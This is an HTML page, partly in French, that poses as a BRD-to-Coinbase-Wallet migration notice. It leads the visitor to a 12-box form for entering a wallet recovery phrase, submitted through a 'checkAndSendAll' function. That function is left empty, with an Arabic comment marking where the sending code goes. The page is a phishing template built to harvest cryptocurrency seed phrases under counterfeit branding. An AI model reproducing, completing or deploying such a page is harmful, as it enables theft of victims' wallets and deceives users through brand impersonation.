<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRD Wallet Migration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1a1a2e;
            --btn-blue: #586cf5;
            --btn-gray: #3e3f5e;
            --text-white: #ffffff;
            --text-secondary: #b0b0cc;
            --grid-border: rgba(255, 255, 255, 0.1);
            --input-bg: #2a2a4a;
            --error-red: #ff4d4d;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        
        body { 
            background-color: var(--bg-color); 
            color: var(--text-white); 
            min-height: 100vh; 
            margin: 0;
            display: flex;
            flex-direction: column;
        }
        
        /* ===== HEADER ===== */
        .top-header {
            width: 100%;
            height: 80px;
            background: linear-gradient(90deg, #f472b6 0%, #fb7185 25%, #fdba74 60%, #fbbf24 100%);
            display: flex;
            align-items: center;
            padding: 0 40px;
            flex-shrink: 0;
        }
        
        .header-logo-img {
            height: 40px;
            width: auto;
        }
        
        /* ===== MAIN CONTENT ===== */
        .main-wrapper {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 20px;
        }
        
        .container { 
            width: 100%; 
            max-width: 480px; 
            display: flex; 
            flex-direction: column; 
            padding: 20px;
        }
        
        @media (min-width: 1024px) { 
            .container { 
                max-width: 450px; 
                border: 1px solid var(--grid-border); 
                border-radius: 20px; 
                background: rgba(26, 26, 46, 0.8);
                padding: 40px;
            } 
        }
        
        .page { display: none; flex-direction: column; animation: fadeIn 0.4s ease; }
        .page.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        .logo-area { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            margin-bottom: 30px; 
        }
        
        .brd-icon {
            width: 140px; 
            height: 140px; 
            border-radius: 35px; 
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            overflow: hidden;
            background-color: #2a2a4a; 
            border: 2px solid rgba(255, 255, 255, 0.2); 
        }
        
        .brd-icon img {
            width: 80%; 
            height: 80%; 
            object-fit: contain; 
        }
        
        h1 { font-size: 26px; font-weight: 700; text-align: center; margin-bottom: 16px; line-height: 1.3; }
        .sub-text { color: var(--text-secondary); text-align: center; font-size: 15px; line-height: 1.6; margin-bottom: 40px; }
        
        .btn { 
            width: 100%; 
            padding: 16px; 
            border-radius: 10px; 
            border: none; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: 0.2s; 
            margin-bottom: 12px;
        }
        .btn-primary { background-color: var(--btn-blue); color: white; }
        .btn-secondary { background-color: var(--btn-gray); color: white; }
        
        .recovery-grid { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 10px; 
            width: 100%; 
        }
        .grid-item { 
            background-color: var(--input-bg); 
            border-radius: 10px; 
            height: 52px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            position: relative; 
            border: 1px solid transparent; 
        }
        .item-input { 
            position: absolute; width: 100%; height: 100%; 
            background: transparent; border: none; color: white; 
            text-align: center; outline: none; z-index: 5; 
        }

        /* ===== FOOTER ===== */
        .bottom-footer {
            width: 100%;
            background: #0f0f1a;
            padding: 50px 40px;
            flex-shrink: 0;
        }
        .footer-logo-img {
            height: 50px;
            width: auto;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <header class="top-header">
        <img src="icone1.png" class="header-logo-img" alt="Logo">
    </header>

    <div class="main-wrapper">
        <div class="container">
            
            <div id="p1" class="page active">
                <div class="logo-area">
                    <div class="brd-icon">
                        <img src="icone2.png" alt="Main Icon">
                    </div>
                </div>
                <h1>BRD has joined<br>Coinbase Wallet!</h1>
                <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
            </div>

            <div id="p2" class="page">
                <h1 style="text-align:left;">Récupérer votre portefeuille</h1>
                <div class="recovery-grid" id="mainGrid"></div>
                <button class="btn btn-primary" style="margin-top:20px;" onclick="checkAndSendAll()">Restaurer</button>
            </div>
            
        </div>
    </div>

    <footer class="bottom-footer">
        <img src="icone3.png" class="footer-logo-img" alt="Footer Logo">
        <p style="color:gray; font-size:12px;">© 2026 Breadwinner AG. All rights reserved.</p>
    </footer>

    <script>
        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        const grid = document.getElementById('mainGrid');
        for (let i = 1; i <= 12; i++) {
            const div = document.createElement('div');
            div.className = 'grid-item';
            div.innerHTML = `<input type="text" class="item-input" placeholder="${i}">`;
            grid.appendChild(div);
        }
        
        async function checkAndSendAll() {
            // منطق الإرسال هنا
        }
    </script>
</body>
</html>
